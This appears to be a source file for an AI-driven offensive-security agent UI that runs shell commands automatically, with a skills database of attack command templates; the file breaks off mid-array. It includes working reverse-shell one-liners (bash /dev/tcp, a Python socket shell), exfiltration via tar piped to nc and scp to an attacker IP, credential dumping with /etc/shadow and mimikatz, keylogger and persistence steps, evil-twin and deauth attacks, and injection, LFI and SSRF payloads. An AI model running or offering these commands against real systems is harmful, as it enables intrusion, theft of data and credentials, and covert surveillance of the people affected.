import React, { useState, useRef, useEffect, useCallback, useMemo } from 'react';
import {
  Shield, Zap, Terminal, AlertTriangle, Search, Send, Play, ChevronRight,
  ChevronDown, ChevronUp, Pause, SkipForward, Download, Trash2, X,
  Settings, Cpu, Database, Wifi, Globe, Lock, Eye, Radio, FileSearch,
  Brain, Target, Wrench, Layers, Activity, Hexagon, Ban, CheckCircle2,
  CircleDot, Loader2, Copy, Check, Flame, Scan, Radar, Crosshair,
  Bug, KeyRound, HardDrive, ShieldCheck, Sword, RotateCcw, Filter,
  FolderOpen, Code2, MonitorSmartphone, ScrollText
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import ReactMarkdown from 'react-markdown';
import { cn } from '../lib/utils';

/* ═══════════════════════════════════════════════════════════════════
   TYPES
   ═══════════════════════════════════════════════════════════════════ */

type SkillCategory = 'recon' | 'exploit' | 'post-exploit' | 'wireless' | 'osint' | 'crypto' | 'forensics' | 'network' | 'utility' | 'privesc' | 'web';
type DangerLevel = 'low' | 'medium' | 'high' | 'critical';
type AgentPhase = 'idle' | 'planning' | 'skill_fetch' | 'executing' | 'analyzing' | 'reporting' | 'completed' | 'error';
type ExecMode = 'auto' | 'manual';

interface Skill {
  id: string;
  name: string;
  category: SkillCategory;
  description: string;
  commands: string[];
  installCmd?: string;
  dangerLevel: DangerLevel;
  tags: string[];
}

interface AgentStep {
  skill_id: string;
  name: string;
  command: string;
  description: string;
  category: string;
  status?: 'pending' | 'running' | 'done' | 'error' | 'skipped';
  output?: string;
}

interface AgentPlan {
  objective: string;
  steps: AgentStep[];
  estimated_time: string;
  risk_level: string;
}

interface ExecutionLogEntry {
  timestamp: number;
  phase: AgentPhase;
  message: string;
  detail?: string;
  skillId?: string;
}

interface MissionResult {
  id: string;
  objective: string;
  plan: AgentPlan;
  logs: ExecutionLogEntry[];
  analysis?: string;
  completedAt?: number;
  status: 'running' | 'completed' | 'error' | 'cancelled';
}

interface PresetMission {
  id: string;
  label: string;
  icon: React.ReactNode;
  prompt: string;
  description: string;
  risk: DangerLevel;
}

interface OpenClawAgentProps {
  onExecuteCommand: (cmd: string) => Promise<string | null>;
  onRunInTerminal: (cmd: string) => void;
}

/* ═══════════════════════════════════════════════════════════════════
   CONSTANTS
   ═══════════════════════════════════════════════════════════════════ */

const ORANGE = '#FF5F1F';
const NEON_GREEN = '#39FF14';
const BG_DARK = '#050505';
const BG_CARD = '#0D0D0D';

const CATEGORY_CONFIG: Record<SkillCategory, { label: string; icon: React.ReactNode; color: string }> = {
  recon:       { label: 'Reconnaissance', icon: <Radar size={13} />,         color: 'text-cyan-400' },
  exploit:     { label: 'Exploitation',    icon: <Bug size={13} />,           color: 'text-red-400' },
  web:         { label: 'Web App',         icon: <Globe size={13} />,         color: 'text-violet-400' },
  privesc:     { label: 'Privilege Esc',   icon: <KeyRound size={13} />,      color: 'text-amber-400' },
  osint:       { label: 'OSINT',           icon: <Search size={13} />,        color: 'text-blue-400' },
  wireless:    { label: 'Wireless',        icon: <Wifi size={13} />,          color: 'text-green-400' },
  crypto:      { label: 'Crypto',          icon: <Lock size={13} />,          color: 'text-yellow-400' },
  forensics:   { label: 'Forensics',       icon: <Eye size={13} />,           color: 'text-teal-400' },
  network:     { label: 'Network',         icon: <Activity size={13} />,      color: 'text-emerald-400' },
  'post-exploit': { label: 'Post-Exploit', icon: <Crosshair size={13} />,    color: 'text-rose-400' },
  utility:     { label: 'Utility',         icon: <Wrench size={13} />,        color: 'text-gray-400' },
};

const DANGER_STYLES: Record<DangerLevel, string> = {
  low:      'text-green-400 bg-green-500/10 border-green-500/20',
  medium:   'text-yellow-400 bg-yellow-500/10 border-yellow-500/20',
  high:     'text-orange-400 bg-orange-500/10 border-orange-500/20',
  critical: 'text-red-400 bg-red-500/10 border-red-500/20 animate-pulse',
};

const PHASE_LABELS: Record<AgentPhase, { label: string; icon: React.ReactNode; color: string }> = {
  idle:         { label: 'STANDBY',    icon: <CircleDot size={12} />,   color: 'text-gray-500' },
  planning:     { label: 'PLANNING',   icon: <Brain size={12} />,       color: 'text-cyan-400' },
  skill_fetch:  { label: 'LOADING',    icon: <Layers size={12} />,      color: 'text-blue-400' },
  executing:    { label: 'EXECUTING',  icon: <Play size={12} />,        color: 'text-green-400' },
  analyzing:    { label: 'ANALYZING',  icon: <Activity size={12} />,    color: 'text-violet-400' },
  reporting:    { label: 'REPORTING',  icon: <ScrollText size={12} />,  color: 'text-amber-400' },
  completed:    { label: 'COMPLETE',   icon: <CheckCircle2 size={12} />,color: 'text-green-400' },
  error:        { label: 'ERROR',      icon: <X size={12} />,           color: 'text-red-400' },
};

/* ═══════════════════════════════════════════════════════════════════
   SKILLS DATABASE — 55 skills across 11 categories
   ═══════════════════════════════════════════════════════════════════ */

const SKILLS_DB: Skill[] = [
  // ── RECON ──
  { id: 'port-scan', name: 'Port Scan', category: 'recon', description: 'Full TCP/UDP port scan with service and version detection', commands: ['nmap -sV -sC -p- {target}', 'nmap -sS -sV -O {target}', 'nmap -A -T4 {target}'], installCmd: 'pkg install nmap', dangerLevel: 'low', tags: ['nmap', 'ports', 'services', 'enumeration'] },
  { id: 'service-enum', name: 'Service Enumeration', category: 'recon', description: 'Deep enumeration of discovered services for versions and configs', commands: ['nmap -sV --script=banner {target}', 'nmap -sV --script=vuln {target}'], installCmd: 'pkg install nmap', dangerLevel: 'low', tags: ['nmap', 'services', 'banners'] },
  { id: 'dns-enum', name: 'DNS Enumeration', category: 'recon', description: 'Enumerate DNS records, zone transfers, and subdomains', commands: ['dig ANY {domain} @nameserver', 'dnsrecon -d {domain}', 'host -t axfr {domain}'], installCmd: 'pkg install dnsutils', dangerLevel: 'low', tags: ['dns', 'dig', 'zone-transfer'] },
  { id: 'subdomain-discovery', name: 'Subdomain Discovery', category: 'recon', description: 'Find subdomains via brute-force, DNS, and passive sources', commands: ['subfinder -d {domain}', 'amass enum -d {domain}', 'gobuster dns -d {domain} -w {wordlist}'], installCmd: 'pkg install subfinder amass', dangerLevel: 'low', tags: ['subdomains', 'brute-force', 'passive'] },
  { id: 'dir-bruteforce', name: 'Directory Bruteforce', category: 'recon', description: 'Discover hidden directories and files on web servers', commands: ['gobuster dir -u {url} -w {wordlist}', 'ffuf -u {url}/FUZZ -w {wordlist}', 'dirb {url} {wordlist}'], installCmd: 'pkg install gobuster ffuf', dangerLevel: 'medium', tags: ['directories', 'files', 'web', 'brute-force'] },
  { id: 'cms-detect', name: 'CMS Detection', category: 'recon', description: 'Identify CMS platform and version (WordPress, Drupal, Joomla)', commands: ['whatweb {url}', 'wpscan --url {url} --enumerate', 'droopescan scan drupal -u {url}'], installCmd: 'pip install whatweb wpscan', dangerLevel: 'low', tags: ['cms', 'wordpress', 'drupal', 'joomla'] },
  { id: 'waf-detect', name: 'WAF Detection', category: 'recon', description: 'Detect and fingerprint Web Application Firewalls', commands: ['wafw00f {url}', 'whatweb {url}', 'nmap --script=http-waf-detect {target}'], installCmd: 'pip install wafw00f', dangerLevel: 'low', tags: ['waf', 'firewall', 'detection'] },
  { id: 'vuln-scan', name: 'Vulnerability Scan', category: 'recon', description: 'Automated vulnerability scanning with NSE scripts', commands: ['nmap --script=vuln {target}', 'nuclei -u {url}', 'nikto -h {url}'], installCmd: 'pkg install nikto && go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest', dangerLevel: 'medium', tags: ['vulnerability', 'nse', 'automated'] },

  // ── EXPLOIT ──
  { id: 'sqli', name: 'SQL Injection', category: 'exploit', description: 'Test for SQL injection vulnerabilities in parameters', commands: ['sqlmap -u "{url}?id=1" --batch', 'sqlmap -u "{url}" --forms --batch', 'sqlmap -r request.txt --batch'], installCmd: 'pip install sqlmap', dangerLevel: 'high', tags: ['sqli', 'database', 'injection', 'owasp'] },
  { id: 'xss-test', name: 'XSS Testing', category: 'exploit', description: 'Cross-site scripting payload testing and detection', commands: ['xsser -u "{url}?q=test" --auto', 'dalfox url "{url}?q=test"', 'echo "<script>alert(1)</script>" | dalfox pipe'], installCmd: 'go install github.com/hahwul/dalfox/v2@latest', dangerLevel: 'high', tags: ['xss', 'javascript', 'injection'] },
  { id: 'ssrf-test', name: 'SSRF Testing', category: 'exploit', description: 'Server-Side Request Forgery detection and exploitation', commands: ['curl "{url}?url=http://169.254.169.254/latest/meta-data/"', 'echo "SSRF test with internal IP targets"'], installCmd: '', dangerLevel: 'high', tags: ['ssrf', 'internal', 'cloud'] },
  { id: 'lfi-rfi', name: 'LFI/RFI', category: 'exploit', description: 'Local and Remote File Inclusion vulnerability testing', commands: ['curl "{url}?file=../../../../etc/passwd"', 'curl "{url}?page=php://filter/convert.base64-encode/resource=index"'], installCmd: '', dangerLevel: 'high', tags: ['lfi', 'rfi', 'file-inclusion'] },
  { id: 'cmd-injection', name: 'Command Injection', category: 'exploit', description: 'OS command injection testing via parameters', commands: ['curl "{url}?cmd=;id"', 'curl "{url}?ip=127.0.0.1;whoami"', 'commix --url="{url}?cmd=test"'], installCmd: 'pip install commix', dangerLevel: 'critical', tags: ['command-injection', 'os-cmd', 'rce'] },
  { id: 'file-upload-bypass', name: 'File Upload Bypass', category: 'exploit', description: 'Bypass file upload restrictions to upload webshells', commands: ['curl -F "file=@shell.php" "{url}/upload"', 'echo "Test double extensions: shell.php.jpg"'], installCmd: '', dangerLevel: 'critical', tags: ['upload', 'bypass', 'webshell'] },
  { id: 'auth-bypass', name: 'Auth Bypass', category: 'exploit', description: 'Authentication bypass testing (SQL, session, JWT)', commands: ['curl -u "admin\' OR \'1\'=\'1":pass "{url}/login"', 'jwt_tool {token} -t at'], installCmd: 'pip install jwt-tool', dangerLevel: 'high', tags: ['auth', 'bypass', 'jwt', 'session'] },
  { id: 'deserialization', name: 'Deserialization', category: 'exploit', description: 'Insecure deserialization exploit testing', commands: ['ysoserial CommonsCollections1 "{command}" | base64', 'echo "Test Java/PHP/Python deserialization payloads"'], installCmd: '', dangerLevel: 'critical', tags: ['deserialization', 'java', 'php', 'rce'] },

  // ── WEB ──
  { id: 'webapp-scan', name: 'Web App Scan', category: 'web', description: 'Full web application security scan', commands: ['nikto -h {url}', 'arachni {url}', 'zap-cli quick-scan -t {url}'], installCmd: 'pkg install nikto', dangerLevel: 'medium', tags: ['webapp', 'nikto', 'arachni', 'owasp'] },
  { id: 'api-test', name: 'API Security Test', category: 'web', description: 'REST/GraphQL API security testing and fuzzing', commands: ['nuclei -t cves/ -u {api_url}', 'ffuf -u {api_url}/FUZZ -w {wordlist}', 'sqlmap -u "{api_url}/endpoint?id=1"'], installCmd: 'pkg install ffuf', dangerLevel: 'medium', tags: ['api', 'rest', 'graphql', 'fuzzing'] },
  { id: 'header-analysis', name: 'Header Analysis', category: 'web', description: 'Analyze HTTP security headers and missing protections', commands: ['curl -sI {url}', 'whatweb {url}', 'nmap --script=http-headers {target}'], installCmd: '', dangerLevel: 'low', tags: ['headers', 'http', 'security'] },
  { id: 'ssl-check', name: 'SSL/TLS Check', category: 'web', description: 'SSL/TLS certificate analysis and cipher evaluation', commands: ['openssl s_client -connect {host}:443 -tls1_2', 'sslscan {host}', 'nmap --script ssl-enum-ciphers -p 443 {host}'], installCmd: 'pkg install openssl-tool sslscan', dangerLevel: 'low', tags: ['ssl', 'tls', 'certificate', 'cipher'] },
  { id: 'cookie-analysis', name: 'Cookie Analysis', category: 'web', description: 'Analyze cookies for security flags and vulnerabilities', commands: ['curl -v {url} 2>&1 | grep Set-Cookie', 'echo "Check: HttpOnly, Secure, SameSite flags"'], installCmd: '', dangerLevel: 'low', tags: ['cookies', 'http', 'session'] },
  { id: 'cors-check', name: 'CORS Check', category: 'web', description: 'Test Cross-Origin Resource Sharing misconfigurations', commands: ['curl -H "Origin: https://evil.com" -I {url}', 'echo "Check Access-Control-Allow-Origin header"'], installCmd: '', dangerLevel: 'medium', tags: ['cors', 'origin', 'misconfiguration'] },
  { id: 'csrf-test', name: 'CSRF Test', category: 'web', description: 'Cross-Site Request Forgery token validation testing', commands: ['curl -v {url} | grep csrf', 'echo "Test state-changing requests without token"'], installCmd: '', dangerLevel: 'medium', tags: ['csrf', 'token', 'request'] },

  // ── PRIVILEGE ESCALATION ──
  { id: 'linux-privesc', name: 'Linux PrivEsc', category: 'privesc', description: 'Comprehensive Linux privilege escalation enumeration', commands: ['linpeas.sh', 'linuxprivchecker.py', 'ls -la /etc/sudoers.d/'], installCmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh', dangerLevel: 'high', tags: ['linux', 'privesc', 'enumeration', 'sudo'] },
  { id: 'android-privesc', name: 'Android PrivEsc', category: 'privesc', description: 'Android/Termux privilege escalation vectors', commands: ['getprop ro.build.version.release', 'find / -perm -4000 -type f 2>/dev/null', 'getcap -r / 2>/dev/null'], installCmd: '', dangerLevel: 'high', tags: ['android', 'termux', 'suid', 'capabilities'] },
  { id: 'kernel-exploit', name: 'Kernel Exploit', category: 'privesc', description: 'Kernel version enumeration and exploit compatibility check', commands: ['uname -a && cat /proc/version', 'cat /etc/os-release', 'searchsploit linux kernel $(uname -r)'], installCmd: 'pkg install exploitdb', dangerLevel: 'critical', tags: ['kernel', 'exploit', 'version'] },
  { id: 'suid-enum', name: 'SUID Enumeration', category: 'privesc', description: 'Find and analyze SUID/SGID binaries for privesc', commands: ['find / -perm -4000 -type f 2>/dev/null', 'find / -perm -2000 -type f 2>/dev/null'], installCmd: '', dangerLevel: 'medium', tags: ['suid', 'sgid', 'binaries'] },
  { id: 'cron-jobs', name: 'Cron Job Inspection', category: 'privesc', description: 'Enumerate cron jobs for hijackable writable paths', commands: ['cat /etc/crontab 2>/dev/null', 'ls -la /etc/cron.* 2>/dev/null', 'crontab -l 2>/dev/null'], installCmd: '', dangerLevel: 'medium', tags: ['cron', 'scheduled', 'persistence'] },
  { id: 'capabilities', name: 'Capabilities Check', category: 'privesc', description: 'Enumerate Linux file capabilities for privesc vectors', commands: ['getcap -r / 2>/dev/null | head -50'], installCmd: 'pkg install libcap', dangerLevel: 'medium', tags: ['capabilities', 'privesc', 'linux'] },
  { id: 'docker-escape', name: 'Docker Escape', category: 'privesc', description: 'Test for Docker container escape vulnerabilities', commands: ['cat /proc/1/cgroup', 'ls -la /.dockerenv', 'find / -name docker.sock 2>/dev/null'], installCmd: '', dangerLevel: 'critical', tags: ['docker', 'container', 'escape'] },

  // ── OSINT ──
  { id: 'email-harvest', name: 'Email Harvest', category: 'osint', description: 'Harvest email addresses from target domain', commands: ['theharvester -d {domain} -b all', 'emailfinder -d {domain}', 'echo "Check Google dorking: site:{domain} @domain.com"'], installCmd: 'pip install theharvester', dangerLevel: 'low', tags: ['email', 'harvest', 'recon'] },
  { id: 'username-search', name: 'Username Search', category: 'osint', description: 'Find accounts across social media platforms', commands: ['sherlock {username}', 'whatsmyname -u {username}', 'maigret {username}'], installCmd: 'pip install sherlock-project maigret', dangerLevel: 'low', tags: ['username', 'social', 'accounts'] },
  { id: 'subdomain-enum', name: 'Subdomain Enumeration', category: 'osint', description: 'Passive and active subdomain discovery', commands: ['amass enum -passive -d {domain}', 'subfinder -d {domain} -silent', 'assetfinder -subs-only {domain}'], installCmd: 'pkg install amass subfinder', dangerLevel: 'low', tags: ['subdomains', 'passive', 'dns'] },
  { id: 'phone-lookup', name: 'Phone Lookup', category: 'osint', description: 'Phone number OSINT and carrier identification', commands: ['phoneinfoga scan -n "+1234567890"', 'echo "Check Truecaller, Numverify, Twilio APIs"'], installCmd: 'pip install phoneinfoga', dangerLevel: 'medium', tags: ['phone', 'number', 'osint'] },
  { id: 'domain-info', name: 'Domain Intelligence', category: 'osint', description: 'WHOIS, registration, and historical domain data', commands: ['whois {domain}', 'dig {domain} ANY +noall +answer', 'nslookup -type=any {domain}'], installCmd: 'pkg install whois dnsutils', dangerLevel: 'low', tags: ['whois', 'domain', 'dns', 'registration'] },
  { id: 'ip-geolocate', name: 'IP Geolocation', category: 'osint', description: 'Geolocate IP addresses and gather network intel', commands: ['curl ipinfo.io/{ip}', 'curl ip-api.com/json/{ip}', 'nmap -sn -O {ip}'], installCmd: '', dangerLevel: 'low', tags: ['ip', 'geo', 'location', 'network'] },
  { id: 'social-search', name: 'Social Media Search', category: 'osint', description: 'Advanced social media profiling and investigation', commands: ['sherlock {username}', 'echo "Check: Facebook Graph Search, LinkedIn, Twitter advanced search"'], installCmd: 'pip install sherlock-project', dangerLevel: 'low', tags: ['social', 'media', 'profile'] },
  { id: 'shodan-search', name: 'Shodan Search', category: 'osint', description: 'Search Shodan for internet-facing devices and services', commands: ['shodan count "{query}"', 'shodan host {ip}', 'shodan search "{query}" --limit 10'], installCmd: 'pip install shodan', dangerLevel: 'low', tags: ['shodan', 'iot', 'devices', 'exposed'] },

  // ── WIRELESS ──
  { id: 'wifi-scan', name: 'WiFi Scan', category: 'wireless', description: 'Scan for nearby WiFi networks and access points', commands: ['iwlist scan 2>/dev/null', 'nmcli device wifi list 2>/dev/null', 'airmon-ng start wlan0'], installCmd: 'pkg install wireless-tools', dangerLevel: 'low', tags: ['wifi', 'scan', 'ap', 'network'] },
  { id: 'wpa-handshake', name: 'WPA Handshake Capture', category: 'wireless', description: 'Capture WPA/WPA2 handshake for offline cracking', commands: ['airodump-ng -c {channel} --bssid {bssid} -w capture wlan0', 'aireplay-ng -0 5 -a {bssid} wlan0'], installCmd: 'pkg install aircrack-ng', dangerLevel: 'medium', tags: ['wpa', 'handshake', 'capture', 'wifi'] },
  { id: 'deauth', name: 'Deauth Attack', category: 'wireless', description: 'WiFi deauthentication attack simulation', commands: ['aireplay-ng -0 10 -a {bssid} -c {client} wlan0', 'echo "Use for authorized testing only"'], installCmd: 'pkg install aircrack-ng', dangerLevel: 'high', tags: ['deauth', 'wifi', 'dos', 'aircrack'] },
  { id: 'evil-twin', name: 'Evil Twin AP', category: 'wireless', description: 'Rogue access point creation for MITM', commands: ['hostapd -B -c hostapd.conf', 'dnsmasq -C dnsmasq.conf', 'echo "Requires external adapter + monitor mode"'], installCmd: 'pkg install hostapd dnsmasq', dangerLevel: 'critical', tags: ['evil-twin', 'ap', 'mitm', 'rogue'] },
  { id: 'bt-scan', name: 'Bluetooth Scan', category: 'wireless', description: 'Scan for nearby Bluetooth devices', commands: ['hcitool scan 2>/dev/null', 'bluetoothctl scan on', 'btscanner 2>/dev/null'], installCmd: 'pkg install bluez', dangerLevel: 'low', tags: ['bluetooth', 'scan', 'ble'] },
  { id: 'rfid', name: 'RFID Cloning', category: 'wireless', description: 'RFID/NFC tag reading and cloning', commands: ['nfcpy-read', 'proxmark3 /dev/ttyACM0', 'echo "Requires hardware: Proxmark3, ACR122U"'], installCmd: 'pip install nfcpy', dangerLevel: 'medium', tags: ['rfid', 'nfc', 'clone', 'proxmark'] },
  { id: 'sdr-recon', name: 'SDR Recon', category: 'wireless', description: 'Software Defined Radio frequency scanning', commands: ['rtl_sdr -f 433M -s 2M -n 10M capture.bin', 'hackrf_transfer -r capture.raw -f 915M -s 10M -l 100', 'echo "Requires RTL-SDR or HackRF hardware"'], installCmd: 'pkg install rtl-sdr hackrf', dangerLevel: 'medium', tags: ['sdr', 'radio', 'frequency', 'rf'] },

  // ── CRYPTO ──
  { id: 'hash-crack', name: 'Hash Cracking', category: 'crypto', description: 'Multi-mode hash cracking with dictionary and rules', commands: ['hashcat -m 0 -a 0 {hash} {wordlist}', 'john --wordlist={wordlist} {hash_file}', 'echo "Supports MD5, SHA1, SHA256, NTLM, bcrypt"'], installCmd: 'pkg install hashcat john', dangerLevel: 'medium', tags: ['hash', 'crack', 'password', 'brute-force'] },
  { id: 'encode-decode', name: 'Encode/Decode', category: 'crypto', description: 'Base64, URL, Hex, and other encoding transformations', commands: ['echo "{text}" | base64 -d', 'echo "{text}" | xxd -r -p', 'python3 -c "import urllib.parse; print(urllib.parse.unquote(\'{text}\'))"'], installCmd: '', dangerLevel: 'low', tags: ['base64', 'hex', 'url', 'encode', 'decode'] },
  { id: 'ssl-analysis', name: 'SSL Deep Analysis', category: 'crypto', description: 'In-depth SSL/TLS configuration analysis', commands: ['sslyze --regular {host}', 'testssl.sh {host}', 'openssl x509 -in cert.pem -text -noout'], installCmd: 'pip install sslyze', dangerLevel: 'low', tags: ['ssl', 'tls', 'certificate', 'analysis'] },
  { id: 'cert-extract', name: 'Certificate Extraction', category: 'crypto', description: 'Extract and analyze SSL certificates', commands: ['openssl s_client -showcerts -connect {host}:443 </dev/null', 'echo | openssl s_client -connect {host}:443 2>/dev/null | openssl x509 -noout -text'], installCmd: 'pkg install openssl-tool', dangerLevel: 'low', tags: ['certificate', 'ssl', 'extract'] },
  { id: 'password-gen', name: 'Password Generator', category: 'crypto', description: 'Generate secure random passwords and wordlists', commands: ['pwgen 16 5', 'openssl rand -base64 16', 'python3 -c "import secrets; print(secrets.token_urlsafe(24))"'], installCmd: 'pkg install pwgen', dangerLevel: 'low', tags: ['password', 'generate', 'random', 'secure'] },
  { id: 'entropy-analysis', name: 'Entropy Analysis', category: 'crypto', description: 'Analyze data entropy for encryption/randomness detection', commands: ['python3 -c "import math,sys; data=sys.stdin.buffer.read(); import collections; c=collections.Counter(data); total=len(data); print(-sum((n/total)*math.log2(n/total) for n in c.values()))"', 'ent {file}'], installCmd: 'pkg install ent', dangerLevel: 'low', tags: ['entropy', 'analysis', 'randomness', 'crypto'] },

  // ── FORENSICS ──
  { id: 'memory-dump', name: 'Memory Dump', category: 'forensics', description: 'Capture and analyze volatile memory', commands: ['volatility -f memory.dmp imageinfo', 'strings memory.dmp | grep -i pass', 'dd if=/dev/mem of=memory.dump bs=1M count=100'], installCmd: 'pip install volatility3', dangerLevel: 'medium', tags: ['memory', 'dump', 'volatile', 'ram'] },
  { id: 'disk-analysis', name: 'Disk Analysis', category: 'forensics', description: 'Analyze disk images and filesystem metadata', commands: ['fsstat disk.img', 'fls -r disk.img', 'mmls disk.img'], installCmd: 'pkg install sleuthkit', dangerLevel: 'medium', tags: ['disk', 'filesystem', 'forensics'] },
  { id: 'log-analysis', name: 'Log Analysis', category: 'forensics', description: 'System and application log analysis for incidents', commands: ['cat /var/log/auth.log | grep -i failed', 'journalctl -u ssh --since "1 day ago"', 'last -f /var/log/wtmp'], installCmd: '', dangerLevel: 'low', tags: ['logs', 'auth', 'events', 'timeline'] },
  { id: 'file-recovery', name: 'File Recovery', category: 'forensics', description: 'Recover deleted files from disk images', commands: ['foremost -i disk.img -o recovered/', 'photorec disk.img', 'scalpel -c scalpel.conf -o output disk.img'], installCmd: 'pkg install foremost scalpel', dangerLevel: 'low', tags: ['recovery', 'deleted', 'carve', 'forensics'] },
  { id: 'stego-analysis', name: 'Stego Analysis', category: 'forensics', description: 'Detect and extract hidden data from files', commands: ['steghide extract -sf image.jpg', 'binwalk image.jpg', 'exiftool image.jpg', 'strings image.jpg | tail -50'], installCmd: 'pkg install steghide binwalk exiftool', dangerLevel: 'low', tags: ['steganography', 'hidden', 'extract'] },
  { id: 'malware-analysis', name: 'Malware Analysis', category: 'forensics', description: 'Static and dynamic malware sample analysis', commands: ['file suspicious_file', 'strings suspicious_file | grep -iE "http|ftp|pass|key|cmd"', 'md5sum suspicious_file && sha256sum suspicious_file'], installCmd: 'pkg install file', dangerLevel: 'high', tags: ['malware', 'static', 'dynamic', 'analysis'] },
  { id: 'pcap-analysis', name: 'PCAP Analysis', category: 'forensics', description: 'Analyze network capture files for suspicious activity', commands: ['tcpdump -r capture.pcap -A', 'tshark -r capture.pcap -Y "http.request"', 'editcap capture.pcap filtered.pcap "port 80"'], installCmd: 'pkg install tcpdump tshark', dangerLevel: 'medium', tags: ['pcap', 'network', 'packets', 'wireshark'] },

  // ── NETWORK ──
  { id: 'packet-capture', name: 'Packet Capture', category: 'network', description: 'Live network packet capture and filtering', commands: ['tcpdump -i any -w capture.pcap -c 1000', 'tcpdump -i wlan0 port 80 -A', 'tcpdump -i any "tcp[tcpflags] & (tcp-syn) != 0"'], installCmd: 'pkg install tcpdump', dangerLevel: 'medium', tags: ['packet', 'capture', 'sniff', 'tcpdump'] },
  { id: 'arp-scan', name: 'ARP Scan', category: 'network', description: 'ARP discovery to find live hosts on LAN', commands: ['arp-scan --localnet', 'arp -a', 'nmap -sn 192.168.1.0/24'], installCmd: 'pkg install arp-scan', dangerLevel: 'low', tags: ['arp', 'discovery', 'lan', 'hosts'] },
  { id: 'netcat-listener', name: 'Netcat Listener', category: 'network', description: 'Set up netcat listener for reverse shells', commands: ['nc -lvnp {port}', 'rlwrap nc -lvnp {port}', 'socat TCP-LISTEN:{port},reuseaddr,fork EXEC:"/bin/bash"'], installCmd: 'pkg install nmap-ncat rlwrap socat', dangerLevel: 'high', tags: ['netcat', 'listener', 'shell', 'bind'] },
  { id: 'reverse-shell', name: 'Reverse Shell Setup', category: 'network', description: 'Generate and manage reverse shell payloads', commands: ['bash -i >& /dev/tcp/{ip}/{port} 0>&1', 'python3 -c "import socket,subprocess,os;s=socket.socket();s.connect((\'{ip}\',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/bash\'])"'], installCmd: '', dangerLevel: 'critical', tags: ['reverse-shell', 'payload', 'rce'] },
  { id: 'tunnel-setup', name: 'Tunnel Setup', category: 'network', description: 'SSH tunneling and port forwarding', commands: ['ssh -L {local_port}:{target}:{remote_port} user@{jump_host}', 'ssh -R {remote_port}:localhost:{local_port} user@{server}', 'ssh -D 8080 user@{server}'], installCmd: 'pkg install openssh', dangerLevel: 'medium', tags: ['tunnel', 'ssh', 'proxy', 'forward'] },
  { id: 'proxy-config', name: 'Proxy Configuration', category: 'network', description: 'Configure HTTP/SOCKS proxies for traffic routing', commands: ['export http_proxy=http://127.0.0.1:8080', 'export https_proxy=http://127.0.0.1:8080', 'proxychains nmap -sT {target}'], installCmd: 'pkg install proxychains-ng', dangerLevel: 'low', tags: ['proxy', 'chain', 'anonymize'] },
  { id: 'firewall-test', name: 'Firewall Test', category: 'network', description: 'Test firewall rules and filter detection', commands: ['nmap -sA {target}', 'nmap -PN -p- {target}', 'hping3 -S {target} -p 80'], installCmd: 'pkg install nmap hping3', dangerLevel: 'medium', tags: ['firewall', 'acl', 'filter', 'test'] },

  // ── POST-EXPLOIT ──
  { id: 'persistence', name: 'Persistence', category: 'post-exploit', description: 'Establish persistent access on compromised systems', commands: ['echo "Add to crontab: * * * * * /path/payload"', 'echo "SSH key injection: ~/.ssh/authorized_keys"', 'echo "Systemd service creation for persistence"'], installCmd: '', dangerLevel: 'critical', tags: ['persistence', 'backdoor', 'crontab', 'ssh'] },
  { id: 'lateral-move', name: 'Lateral Movement', category: 'post-exploit', description: 'Move laterally through a compromised network', commands: ['sshpass -p "{password}" ssh user@{host}', 'psexec.py {domain}/{user}:{password}@{host}', 'crackmapexec smb {subnet} -u {user} -p {password}'], installCmd: 'pip install impacket crackmapexec', dangerLevel: 'critical', tags: ['lateral', 'movement', 'network', 'pivot'] },
  { id: 'credential-dump', name: 'Credential Dumping', category: 'post-exploit', description: 'Extract stored credentials from system', commands: ['cat /etc/shadow', 'mimikatz "sekurlsa::logonpasswords"', 'python3 -c "import keyring; print(keyring.get_password(\'service\',\'user\'))"'], installCmd: '', dangerLevel: 'critical', tags: ['credentials', 'dump', 'hashes', 'passwords'] },
  { id: 'keylogger', name: 'Keylogger Setup', category: 'post-exploit', description: 'Deploy keyboard logging on compromised targets', commands: ['logkeys -s -o /tmp/keylog.txt', 'echo "Requires root/sudo for input device access"'], installCmd: 'apt install logkeys', dangerLevel: 'critical', tags: ['keylogger', 'spy', 'input', 'capture'] },
  { id: 'screen-capture', name: 'Screen Capture', category: 'post-exploit', description: 'Capture screenshots from compromised systems', commands: ['import -window root screenshot.png', 'scrot /tmp/screenshot.png', 'screencapture -x /tmp/screen.png'], installCmd: 'pkg install imagemagick', dangerLevel: 'high', tags: ['screenshot', 'capture', 'screen'] },
  { id: 'data-exfil', name: 'Data Exfiltration', category: 'post-exploit', description: 'Extract and transfer data from compromised systems', commands: ['tar czf - /target/dir | nc {ip} {port}', 'scp -r target/ user@{ip}:/dest/', 'rsync -avz target/ user@{ip}:/dest/'], installCmd: '', dangerLevel: 'critical', tags: ['exfil', 'data', 'transfer', 'steal'] },
  { id: 'rootkit-check', name: 'Rootkit Detection', category: 'post-exploit', description: 'Scan for rootkits and hidden processes', commands: ['rkhunter --check', 'chkrootkit', 'lsmod | grep -iE "hide|root"'], installCmd: 'pkg install rkhunter chkrootkit', dangerLevel: 'medium', tags: ['rootkit', 'detection', 'hidden', 'malware'] },

  // ── UTILITY ──
  { id: 'file-transfer', name: 'File Transfer', category: 'utility', description: 'Transfer files between systems using various methods', commands: ['python3 -m http.server 8080', 'scp file user@host:/path/', 'nc -lvp {port} > file && nc {ip} {port} < file'], installCmd: '', dangerLevel: 'low', tags: ['transfer', 'upload', 'download', 'http'] },
  { id: 'download-file', name: 'Download File', category: 'utility', description: 'Download files from URLs using curl/wget', commands: ['curl -O {url}', 'wget {url}', 'aria2c -x 8 {url}'], installCmd: 'pkg install wget aria2', dangerLevel: 'low', tags: ['download', 'curl', 'wget', 'fetch'] },
  { id: 'upload-file', name: 'Upload File', category: 'utility', description: 'Upload files to remote servers', commands: ['curl -F "file=@{file}" {url}', 'scp {file} user@{host}:/path/', 'rsync -avz {file} user@{host}:/path/'], installCmd: '', dangerLevel: 'low', tags: ['upload', 'curl', 'scp', 'transfer'] },
  { id: 'archive', name: 'Archive/Compress', category: 'utility', description: 'Create and extract archives', commands: ['tar czf archive.tar.gz files/', 'unzip archive.zip -d dest/', '7z a archive.7z files/'], installCmd: 'pkg install p7zip', dangerLevel: 'low', tags: ['archive', 'compress', 'zip', 'tar'] },
